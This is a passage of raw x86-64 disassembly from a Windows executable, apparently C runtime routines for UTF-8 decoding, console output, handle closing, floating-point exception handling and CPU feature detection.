   14000df92:	48 ff c7             	inc    %rdi
   14000df95:	8a c1                	mov    %cl,%al
   14000df97:	24 c0                	and    $0xc0,%al
   14000df99:	3c 80                	cmp    $0x80,%al
   14000df9b:	0f 85 89 00 00 00    	jne    0x14000e02a
   14000dfa1:	8b c2                	mov    %edx,%eax
   14000dfa3:	83 e1 3f             	and    $0x3f,%ecx
   14000dfa6:	c1 e0 06             	shl    $0x6,%eax
   14000dfa9:	8b d1                	mov    %ecx,%edx
   14000dfab:	0b d0                	or     %eax,%edx
   14000dfad:	48 8b c7             	mov    %rdi,%rax
   14000dfb0:	49 2b c4             	sub    %r12,%rax
   14000dfb3:	49 3b c1             	cmp    %r9,%rax
   14000dfb6:	72 d7                	jb     0x14000df8f
   14000dfb8:	4c 3b cd             	cmp    %rbp,%r9
   14000dfbb:	73 1c                	jae    0x14000dfd9
   14000dfbd:	41 0f b6 c0          	movzbl %r8b,%eax
   14000dfc1:	41 2a d9             	sub    %r9b,%bl
   14000dfc4:	66 41 89 42 04       	mov    %ax,0x4(%r10)
   14000dfc9:	0f b6 c3             	movzbl %bl,%eax
   14000dfcc:	66 41 89 42 06       	mov    %ax,0x6(%r10)
   14000dfd1:	41 89 12             	mov    %edx,(%r10)
   14000dfd4:	e9 03 ff ff ff       	jmp    0x14000dedc
   14000dfd9:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000dfdf:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000dfe4:	76 44                	jbe    0x14000e02a
   14000dfe6:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000dfec:	73 3c                	jae    0x14000e02a
   14000dfee:	41 0f b6 c0          	movzbl %r8b,%eax
   14000dff2:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000dff9:	00 
   14000dffa:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000e001:	00 
   14000e002:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000e009:	00 
   14000e00a:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000e00e:	72 1a                	jb     0x14000e02a
   14000e010:	4d 85 f6             	test   %r14,%r14
   14000e013:	74 03                	je     0x14000e018
   14000e015:	41 89 16             	mov    %edx,(%r14)
   14000e018:	f7 da                	neg    %edx
   14000e01a:	49 8b d2             	mov    %r10,%rdx
   14000e01d:	48 1b c9             	sbb    %rcx,%rcx
   14000e020:	48 23 cd             	and    %rbp,%rcx
   14000e023:	e8 34 fe ff ff       	call   0x14000de5c
   14000e028:	eb 0b                	jmp    0x14000e035
   14000e02a:	48 8b d6             	mov    %rsi,%rdx
   14000e02d:	49 8b ca             	mov    %r10,%rcx
   14000e030:	e8 2f fe ff ff       	call   0x14000de64
   14000e035:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000e03a:	48 33 cc             	xor    %rsp,%rcx
   14000e03d:	e8 1e 33 ff ff       	call   0x140001360
   14000e042:	48 83 c4 40          	add    $0x40,%rsp
   14000e046:	41 5f                	pop    %r15
   14000e048:	41 5e                	pop    %r14
   14000e04a:	41 5c                	pop    %r12
   14000e04c:	5f                   	pop    %rdi
   14000e04d:	5e                   	pop    %rsi
   14000e04e:	5d                   	pop    %rbp
   14000e04f:	5b                   	pop    %rbx
   14000e050:	c3                   	ret
   14000e051:	cc                   	int3
   14000e052:	cc                   	int3
   14000e053:	cc                   	int3
   14000e054:	40 53                	rex push %rbx
   14000e056:	48 83 ec 40          	sub    $0x40,%rsp
   14000e05a:	48 8b 05 af c9 00 00 	mov    0xc9af(%rip),%rax        # 0x14001aa10
   14000e061:	33 db                	xor    %ebx,%ebx
   14000e063:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000e067:	75 2e                	jne    0x14000e097
   14000e069:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000e06e:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000e072:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000e076:	48 8d 0d 93 7f 00 00 	lea    0x7f93(%rip),%rcx        # 0x140016010
   14000e07d:	45 33 c9             	xor    %r9d,%r9d
   14000e080:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000e085:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000e08a:	ff 15 88 1f 00 00    	call   *0x1f88(%rip)        # 0x140010018
   14000e090:	48 89 05 79 c9 00 00 	mov    %rax,0xc979(%rip)        # 0x14001aa10
   14000e097:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e09b:	0f 95 c3             	setne  %bl
   14000e09e:	8b c3                	mov    %ebx,%eax
   14000e0a0:	48 83 c4 40          	add    $0x40,%rsp
   14000e0a4:	5b                   	pop    %rbx
   14000e0a5:	c3                   	ret
   14000e0a6:	cc                   	int3
   14000e0a7:	cc                   	int3
   14000e0a8:	48 83 ec 28          	sub    $0x28,%rsp
   14000e0ac:	48 8b 0d 5d c9 00 00 	mov    0xc95d(%rip),%rcx        # 0x14001aa10
   14000e0b3:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000e0b7:	77 06                	ja     0x14000e0bf
   14000e0b9:	ff 15 49 1f 00 00    	call   *0x1f49(%rip)        # 0x140010008
   14000e0bf:	48 83 c4 28          	add    $0x28,%rsp
   14000e0c3:	c3                   	ret
   14000e0c4:	48 8b c4             	mov    %rsp,%rax
   14000e0c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000e0cb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000e0cf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e0d3:	57                   	push   %rdi
   14000e0d4:	48 83 ec 40          	sub    $0x40,%rsp
   14000e0d8:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000e0dd:	49 8b f8             	mov    %r8,%rdi
   14000e0e0:	4d 8b c8             	mov    %r8,%r9
   14000e0e3:	8b f2                	mov    %edx,%esi
   14000e0e5:	44 8b c2             	mov    %edx,%r8d
   14000e0e8:	48 8b e9             	mov    %rcx,%rbp
   14000e0eb:	48 8b d1             	mov    %rcx,%rdx
   14000e0ee:	48 8b 0d 1b c9 00 00 	mov    0xc91b(%rip),%rcx        # 0x14001aa10
   14000e0f5:	ff 15 15 1f 00 00    	call   *0x1f15(%rip)        # 0x140010010
   14000e0fb:	8b d8                	mov    %eax,%ebx
   14000e0fd:	85 c0                	test   %eax,%eax
   14000e0ff:	75 6a                	jne    0x14000e16b
   14000e101:	ff 15 d1 1f 00 00    	call   *0x1fd1(%rip)        # 0x1400100d8
   14000e107:	83 f8 06             	cmp    $0x6,%eax
   14000e10a:	75 5f                	jne    0x14000e16b
   14000e10c:	48 8b 0d fd c8 00 00 	mov    0xc8fd(%rip),%rcx        # 0x14001aa10
   14000e113:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000e117:	77 06                	ja     0x14000e11f
   14000e119:	ff 15 e9 1e 00 00    	call   *0x1ee9(%rip)        # 0x140010008
   14000e11f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000e125:	48 8d 0d e4 7e 00 00 	lea    0x7ee4(%rip),%rcx        # 0x140016010
   14000e12c:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000e131:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000e137:	45 33 c9             	xor    %r9d,%r9d
   14000e13a:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000e13f:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000e144:	ff 15 ce 1e 00 00    	call   *0x1ece(%rip)        # 0x140010018
   14000e14a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000e150:	4c 8b cf             	mov    %rdi,%r9
   14000e153:	48 8b c8             	mov    %rax,%rcx
   14000e156:	48 89 05 b3 c8 00 00 	mov    %rax,0xc8b3(%rip)        # 0x14001aa10
   14000e15d:	44 8b c6             	mov    %esi,%r8d
   14000e160:	48 8b d5             	mov    %rbp,%rdx
   14000e163:	ff 15 a7 1e 00 00    	call   *0x1ea7(%rip)        # 0x140010010
   14000e169:	8b d8                	mov    %eax,%ebx
   14000e16b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000e170:	8b c3                	mov    %ebx,%eax
   14000e172:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000e177:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000e17c:	48 83 c4 40          	add    $0x40,%rsp
   14000e180:	5f                   	pop    %rdi
   14000e181:	c3                   	ret
   14000e182:	cc                   	int3
   14000e183:	cc                   	int3
   14000e184:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e189:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000e18e:	57                   	push   %rdi
   14000e18f:	48 83 ec 20          	sub    $0x20,%rsp
   14000e193:	49 8b f9             	mov    %r9,%rdi
   14000e196:	49 8b d8             	mov    %r8,%rbx
   14000e199:	8b 0a                	mov    (%rdx),%ecx
   14000e19b:	e8 40 ad ff ff       	call   0x140008ee0
   14000e1a0:	90                   	nop
   14000e1a1:	48 8b 03             	mov    (%rbx),%rax
   14000e1a4:	48 63 08             	movslq (%rax),%rcx
   14000e1a7:	4c 8b d1             	mov    %rcx,%r10
   14000e1aa:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000e1ae:	48 8b c1             	mov    %rcx,%rax
   14000e1b1:	48 c1 f8 06          	sar    $0x6,%rax
   14000e1b5:	4c 8d 0d 74 d4 00 00 	lea    0xd474(%rip),%r9        # 0x14001b630
   14000e1bc:	41 83 e2 3f          	and    $0x3f,%r10d
   14000e1c0:	4f 8d 04 d2          	lea    (%r10,%r10,8),%r8
   14000e1c4:	49 8b 04 c1          	mov    (%r9,%rax,8),%rax
   14000e1c8:	42 f6 44 c0 38 01    	testb  $0x1,0x38(%rax,%r8,8)
   14000e1ce:	74 09                	je     0x14000e1d9
   14000e1d0:	e8 eb 00 00 00       	call   0x14000e2c0
   14000e1d5:	8b d8                	mov    %eax,%ebx
   14000e1d7:	eb 0e                	jmp    0x14000e1e7
   14000e1d9:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e1dd:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e1e4:	83 cb ff             	or     $0xffffffff,%ebx
   14000e1e7:	8b 0f                	mov    (%rdi),%ecx
   14000e1e9:	e8 1a ad ff ff       	call   0x140008f08
   14000e1ee:	8b c3                	mov    %ebx,%eax
   14000e1f0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e1f5:	48 83 c4 20          	add    $0x20,%rsp
   14000e1f9:	5f                   	pop    %rdi
   14000e1fa:	c3                   	ret
   14000e1fb:	cc                   	int3
   14000e1fc:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e200:	48 83 ec 58          	sub    $0x58,%rsp
   14000e204:	4c 63 c1             	movslq %ecx,%r8
   14000e207:	45 33 c9             	xor    %r9d,%r9d
   14000e20a:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   14000e20e:	75 18                	jne    0x14000e228
   14000e210:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000e214:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000e218:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e21c:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e223:	e9 8d 00 00 00       	jmp    0x14000e2b5
   14000e228:	85 c9                	test   %ecx,%ecx
   14000e22a:	78 60                	js     0x14000e28c
   14000e22c:	44 3b 05 fd d7 00 00 	cmp    0xd7fd(%rip),%r8d        # 0x14001ba30
   14000e233:	73 57                	jae    0x14000e28c
   14000e235:	49 8b c8             	mov    %r8,%rcx
   14000e238:	4c 8d 15 f1 d3 00 00 	lea    0xd3f1(%rip),%r10        # 0x14001b630
   14000e23f:	83 e1 3f             	and    $0x3f,%ecx
   14000e242:	49 8b c0             	mov    %r8,%rax
   14000e245:	48 c1 f8 06          	sar    $0x6,%rax
   14000e249:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000e24d:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   14000e251:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000e256:	74 34                	je     0x14000e28c
   14000e258:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000e25d:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000e262:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
   14000e267:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000e26c:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000e271:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   14000e276:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000e27b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000e280:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000e285:	e8 fa fe ff ff       	call   0x14000e184
   14000e28a:	eb 2c                	jmp    0x14000e2b8
   14000e28c:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000e290:	45 33 c0             	xor    %r8d,%r8d
   14000e293:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000e297:	33 c9                	xor    %ecx,%ecx
   14000e299:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e29d:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000e2a2:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e2a9:	33 d2                	xor    %edx,%edx
   14000e2ab:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000e2b0:	e8 f7 86 ff ff       	call   0x1400069ac
   14000e2b5:	83 c8 ff             	or     $0xffffffff,%eax
   14000e2b8:	48 83 c4 58          	add    $0x58,%rsp
   14000e2bc:	c3                   	ret
   14000e2bd:	cc                   	int3
   14000e2be:	cc                   	int3
   14000e2bf:	cc                   	int3
   14000e2c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e2c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000e2ca:	57                   	push   %rdi
   14000e2cb:	48 83 ec 20          	sub    $0x20,%rsp
   14000e2cf:	48 63 f9             	movslq %ecx,%rdi
   14000e2d2:	48 8b f2             	mov    %rdx,%rsi
   14000e2d5:	8b cf                	mov    %edi,%ecx
   14000e2d7:	e8 10 ad ff ff       	call   0x140008fec
   14000e2dc:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e2e0:	75 04                	jne    0x14000e2e6
   14000e2e2:	33 db                	xor    %ebx,%ebx
   14000e2e4:	eb 5a                	jmp    0x14000e340
   14000e2e6:	48 8b 05 43 d3 00 00 	mov    0xd343(%rip),%rax        # 0x14001b630
   14000e2ed:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000e2f2:	83 ff 01             	cmp    $0x1,%edi
   14000e2f5:	75 09                	jne    0x14000e300
   14000e2f7:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000e2fe:	75 0d                	jne    0x14000e30d
   14000e300:	3b f9                	cmp    %ecx,%edi
   14000e302:	75 20                	jne    0x14000e324
   14000e304:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000e30b:	74 17                	je     0x14000e324
   14000e30d:	e8 da ac ff ff       	call   0x140008fec
   14000e312:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000e317:	48 8b d8             	mov    %rax,%rbx
   14000e31a:	e8 cd ac ff ff       	call   0x140008fec
   14000e31f:	48 3b c3             	cmp    %rbx,%rax
   14000e322:	74 be                	je     0x14000e2e2
   14000e324:	8b cf                	mov    %edi,%ecx
   14000e326:	e8 c1 ac ff ff       	call   0x140008fec
   14000e32b:	48 8b c8             	mov    %rax,%rcx
   14000e32e:	ff 15 d4 1c 00 00    	call   *0x1cd4(%rip)        # 0x140010008
   14000e334:	85 c0                	test   %eax,%eax
   14000e336:	75 aa                	jne    0x14000e2e2
   14000e338:	ff 15 9a 1d 00 00    	call   *0x1d9a(%rip)        # 0x1400100d8
   14000e33e:	8b d8                	mov    %eax,%ebx
   14000e340:	8b cf                	mov    %edi,%ecx
   14000e342:	e8 e9 ab ff ff       	call   0x140008f30
   14000e347:	48 8b d7             	mov    %rdi,%rdx
   14000e34a:	4c 8d 05 df d2 00 00 	lea    0xd2df(%rip),%r8        # 0x14001b630
   14000e351:	83 e2 3f             	and    $0x3f,%edx
   14000e354:	48 8b cf             	mov    %rdi,%rcx
   14000e357:	48 c1 f9 06          	sar    $0x6,%rcx
   14000e35b:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000e35f:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000e363:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000e368:	85 db                	test   %ebx,%ebx
   14000e36a:	74 0f                	je     0x14000e37b
   14000e36c:	48 8b d6             	mov    %rsi,%rdx
   14000e36f:	8b cb                	mov    %ebx,%ecx
   14000e371:	e8 fa 87 ff ff       	call   0x140006b70
   14000e376:	83 c8 ff             	or     $0xffffffff,%eax
   14000e379:	eb 02                	jmp    0x14000e37d
   14000e37b:	33 c0                	xor    %eax,%eax
   14000e37d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e382:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000e387:	48 83 c4 20          	add    $0x20,%rsp
   14000e38b:	5f                   	pop    %rdi
   14000e38c:	c3                   	ret
   14000e38d:	cc                   	int3
   14000e38e:	cc                   	int3
   14000e38f:	cc                   	int3
   14000e390:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000e394:	33 c0                	xor    %eax,%eax
   14000e396:	48 89 01             	mov    %rax,(%rcx)
   14000e399:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000e39d:	89 41 10             	mov    %eax,0x10(%rcx)
   14000e3a0:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000e3a4:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000e3a8:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000e3ab:	c3                   	ret
   14000e3ac:	48 8b c4             	mov    %rsp,%rax
   14000e3af:	53                   	push   %rbx
   14000e3b0:	48 83 ec 50          	sub    $0x50,%rsp
   14000e3b4:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000e3bb:	00 00 
   14000e3bd:	8b d9                	mov    %ecx,%ebx
   14000e3bf:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000e3c6:	00 00 
   14000e3c8:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000e3cd:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000e3d0:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000e3d7:	00 
   14000e3d8:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000e3dd:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000e3e2:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000e3e7:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000e3eb:	e8 20 07 00 00       	call   0x14000eb10
   14000e3f0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000e3f5:	e8 b2 66 ff ff       	call   0x140004aac
   14000e3fa:	85 c0                	test   %eax,%eax
   14000e3fc:	75 07                	jne    0x14000e405
   14000e3fe:	8b cb                	mov    %ebx,%ecx
   14000e400:	e8 bb 06 00 00       	call   0x14000eac0
   14000e405:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000e40b:	48 83 c4 50          	add    $0x50,%rsp
   14000e40f:	5b                   	pop    %rbx
   14000e410:	c3                   	ret
   14000e411:	cc                   	int3
   14000e412:	cc                   	int3
   14000e413:	cc                   	int3
   14000e414:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e419:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000e41e:	57                   	push   %rdi
   14000e41f:	48 83 ec 20          	sub    $0x20,%rsp
   14000e423:	8b d9                	mov    %ecx,%ebx
   14000e425:	48 8b f2             	mov    %rdx,%rsi
   14000e428:	83 e3 1f             	and    $0x1f,%ebx
   14000e42b:	8b f9                	mov    %ecx,%edi
   14000e42d:	f6 c1 08             	test   $0x8,%cl
   14000e430:	74 14                	je     0x14000e446
   14000e432:	40 84 f6             	test   %sil,%sil
   14000e435:	79 0f                	jns    0x14000e446
   14000e437:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000e43c:	e8 4b 07 00 00       	call   0x14000eb8c
   14000e441:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000e444:	eb 57                	jmp    0x14000e49d
   14000e446:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000e44b:	40 84 f9             	test   %dil,%cl
   14000e44e:	74 11                	je     0x14000e461
   14000e450:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000e455:	73 0a                	jae    0x14000e461
   14000e457:	e8 30 07 00 00       	call   0x14000eb8c
   14000e45c:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000e45f:	eb 3c                	jmp    0x14000e49d
   14000e461:	40 f6 c7 01          	test   $0x1,%dil
   14000e465:	74 16                	je     0x14000e47d
   14000e467:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000e46c:	73 0f                	jae    0x14000e47d
   14000e46e:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000e473:	e8 14 07 00 00       	call   0x14000eb8c
   14000e478:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000e47b:	eb 20                	jmp    0x14000e49d
   14000e47d:	40 f6 c7 02          	test   $0x2,%dil
   14000e481:	74 1a                	je     0x14000e49d
   14000e483:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000e488:	73 13                	jae    0x14000e49d
   14000e48a:	40 f6 c7 10          	test   $0x10,%dil
   14000e48e:	74 0a                	je     0x14000e49a
   14000e490:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000e495:	e8 f2 06 00 00       	call   0x14000eb8c
   14000e49a:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000e49d:	40 f6 c7 10          	test   $0x10,%dil
   14000e4a1:	74 14                	je     0x14000e4b7
   14000e4a3:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000e4a8:	73 0d                	jae    0x14000e4b7
   14000e4aa:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000e4af:	e8 d8 06 00 00       	call   0x14000eb8c
   14000e4b4:	83 e3 ef             	and    $0xffffffef,%ebx
   14000e4b7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000e4bc:	33 c0                	xor    %eax,%eax
   14000e4be:	85 db                	test   %ebx,%ebx
   14000e4c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e4c5:	0f 94 c0             	sete   %al
   14000e4c8:	48 83 c4 20          	add    $0x20,%rsp
   14000e4cc:	5f                   	pop    %rdi
   14000e4cd:	c3                   	ret
   14000e4ce:	cc                   	int3
   14000e4cf:	cc                   	int3
   14000e4d0:	48 8b c4             	mov    %rsp,%rax
   14000e4d3:	55                   	push   %rbp
   14000e4d4:	53                   	push   %rbx
   14000e4d5:	56                   	push   %rsi
   14000e4d6:	57                   	push   %rdi
   14000e4d7:	41 56                	push   %r14
   14000e4d9:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000e4dd:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000e4e4:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000e4e8:	48 8b 05 11 bb 00 00 	mov    0xbb11(%rip),%rax        # 0x14001a000
   14000e4ef:	48 33 c4             	xor    %rsp,%rax
   14000e4f2:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000e4f6:	8b f2                	mov    %edx,%esi
   14000e4f8:	4c 8b f1             	mov    %rcx,%r14
   14000e4fb:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000e500:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000e505:	41 8b f9             	mov    %r9d,%edi
   14000e508:	49 8b d8             	mov    %r8,%rbx
   14000e50b:	e8 00 06 00 00       	call   0x14000eb10
   14000e510:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000e513:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000e518:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000e51d:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000e523:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000e528:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   14000e52e:	e8 e1 fe ff ff       	call   0x14000e414
   14000e533:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000e538:	85 c0                	test   %eax,%eax
   14000e53a:	75 40                	jne    0x14000e57c
   14000e53c:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000e540:	75 11                	jne    0x14000e553
   14000e542:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000e545:	83 e0 e3             	and    $0xffffffe3,%eax
   14000e548:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000e54d:	83 c8 03             	or     $0x3,%eax
   14000e550:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000e553:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000e557:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000e55c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000e561:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000e566:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000e56a:	44 8b ce             	mov    %esi,%r9d
   14000e56d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000e572:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e577:	e8 14 02 00 00       	call   0x14000e790
   14000e57c:	e8 03 65 ff ff       	call   0x140004a84
   14000e581:	84 c0                	test   %al,%al
   14000e583:	74 34                	je     0x14000e5b9
   14000e585:	85 ff                	test   %edi,%edi
   14000e587:	74 30                	je     0x14000e5b9
   14000e589:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000e58e:	4d 8b c6             	mov    %r14,%r8
   14000e591:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000e597:	8b cf                	mov    %edi,%ecx
   14000e599:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000e59e:	8b 55 67             	mov    0x67(%rbp),%edx
   14000e5a1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000e5a6:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000e5ac:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000e5b2:	e8 f5 fd ff ff       	call   0x14000e3ac
   14000e5b7:	eb 1c                	jmp    0x14000e5d5
   14000e5b9:	8b cf                	mov    %edi,%ecx
   14000e5bb:	e8 00 05 00 00       	call   0x14000eac0
   14000e5c0:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000e5c5:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000e5ca:	e8 41 05 00 00       	call   0x14000eb10
   14000e5cf:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000e5d5:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000e5d9:	48 33 cc             	xor    %rsp,%rcx
   14000e5dc:	e8 7f 2d ff ff       	call   0x140001360
   14000e5e1:	0f 28 b4 24 d0 00 00 	movaps 0xd0(%rsp),%xmm6
   14000e5e8:	00 
   14000e5e9:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000e5f0:	41 5e                	pop    %r14
   14000e5f2:	5f                   	pop    %rdi
   14000e5f3:	5e                   	pop    %rsi
   14000e5f4:	5b                   	pop    %rbx
   14000e5f5:	5d                   	pop    %rbp
   14000e5f6:	c3                   	ret
   14000e5f7:	cc                   	int3
   14000e5f8:	cc                   	int3
   14000e5f9:	cc                   	int3
   14000e5fa:	cc                   	int3
   14000e5fb:	cc                   	int3
   14000e5fc:	cc                   	int3
   14000e5fd:	cc                   	int3
   14000e5fe:	cc                   	int3
   14000e5ff:	cc                   	int3
   14000e600:	40 53                	rex push %rbx
   14000e602:	48 83 ec 10          	sub    $0x10,%rsp
   14000e606:	45 33 c0             	xor    %r8d,%r8d
   14000e609:	33 c9                	xor    %ecx,%ecx
   14000e60b:	44 89 05 3e d6 00 00 	mov    %r8d,0xd63e(%rip)        # 0x14001bc50
   14000e612:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000e616:	41 8b c1             	mov    %r9d,%eax
   14000e619:	0f a2                	cpuid
   14000e61b:	89 04 24             	mov    %eax,(%rsp)
   14000e61e:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000e623:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e627:	23 c8                	and    %eax,%ecx
   14000e629:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000e62d:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000e631:	3b c8                	cmp    %eax,%ecx
   14000e633:	75 2c                	jne    0x14000e661
   14000e635:	33 c9                	xor    %ecx,%ecx
   14000e637:	0f 01 d0             	xgetbv
   14000e63a:	48 c1 e2 20          	shl    $0x20,%rdx
   14000e63e:	48 0b d0             	or     %rax,%rdx
